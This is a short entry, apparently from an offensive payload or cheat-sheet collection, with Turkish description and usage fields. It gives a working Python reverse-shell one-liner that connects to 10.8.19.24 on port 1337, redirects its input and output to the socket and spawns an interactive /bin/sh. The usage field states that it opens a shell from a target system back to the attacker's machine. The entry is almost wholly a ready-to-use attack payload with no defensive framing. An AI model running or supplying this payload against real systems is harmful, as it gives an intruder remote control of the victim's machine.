reverse_shell_socket.desc: Python socket ile reverse shell bağlantısı
reverse_shell_socket.command: import socket, subprocess, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("10.8.19.24", 1337)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); subprocess.call(["/bin/sh", "-i"])
reverse_shell_socket.usage: Hedef sistemden saldırgan makineye reverse shell bağlantısı kurmak için
